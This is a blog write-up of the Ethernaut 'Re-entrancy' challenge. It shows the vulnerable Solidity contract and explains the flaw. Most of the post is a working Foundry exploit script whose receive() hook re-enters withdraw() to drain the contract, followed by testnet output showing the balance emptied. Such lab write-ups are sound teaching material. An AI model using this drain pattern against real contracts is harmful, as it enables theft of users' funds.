---
layout: post
title: "[Ethernaut] Re-entrancy"
tags: blockchain ethernaut foundry reentrancy
---

# Analysis

---

The goal is

1. steal all the funds from the contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

In, `withdraw()`  function, sending ether before updating the `balances` state can lead to Reentrancy vulnerability.

[Solidity 0.8.30 Documentation - security considerations](https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy)

> 💡 To avoid reentrancy, you can use the Checks-Effects-Interactions pattern


# Exploit

---

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentrance.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Ex {
    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));

    constructor() public payable {
        reentrance_.donate{value: 0.001 ether}(address(this));
    }

    function ex() external {
        reentrance_.withdraw(0.001 ether);
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
    }

    receive() external payable {
        reentrance_.withdraw(0.001 ether);
    }
}

contract ReentranceSol is Script {
    Reentrance public reentrance_ = Reentrance(payable(0x36511c736Efd4C03569b41Da1a5C8f4a4dc0CCC1));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before instance balances: ", address(reentrance_).balance);
        Ex ex = new Ex{value: 0.001 ether}();
        ex.ex();
        console.log("After instance balances: ", address(reentrance_).balance);

        vm.stopBroadcast();
    }
}
```

```bash
$ forge script script/Reentrance.sol --tc ReentranceSol --broadcast
[⠊] Compiling...
[⠒] Compiling 1 files with Solc 0.6.12
[⠑] Solc 0.6.12 finished in 492.00ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
script/Reentrance.sol:17:10: Warning: Unused local variable.
        (bool result,) = msg.sender.call{value: 0.002 ether}("");
         ^---------^
Script ran successfully.

== Logs ==
  Before instance balances:  1000000000000000
  After instance balances:  0

## Setting up 1 EVM.

==========================

Chain 17000

Estimated gas price: 0.001001646 gwei

Estimated total gas used for script: 415285

Estimated amount required: 0.00000041596855911 ETH

==========================
⠄ Sequence #1 on holesky | Waiting for pending transactions
    ⡀ [Pending] 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252
    ⡀ [Pending] 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06

##### holesky
✅  [Success] Hash: 0x465421879dfae55ef90aed855ad8ee7312a3ea7cc7aceddcd22b7e02f087d252
Contract Address: 0x87347d80F8e415A3344cA3861A49393BC95C7F29
Block: 3688507
Paid: 0.000000250340138956 ETH (249932 gas * 0.001001633 gwei)

##### holesky
✅  [Success] Hash: 0xe37af4e6476d699378f0b0de9f7b243e5b51ace04ee80c156e045ba542a41d06
Block: 3688507
Paid: 0.000000061895911235 ETH (61795 gas * 0.001001633 gwei)

✅ Sequence #1 on holesky | Total Paid: 0.000000312236050191 ETH (311727 gas * avg 0.001001633 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```

![Image complete]({{site.url}}/images/2025-04-20-Re-entrancy/complete.png)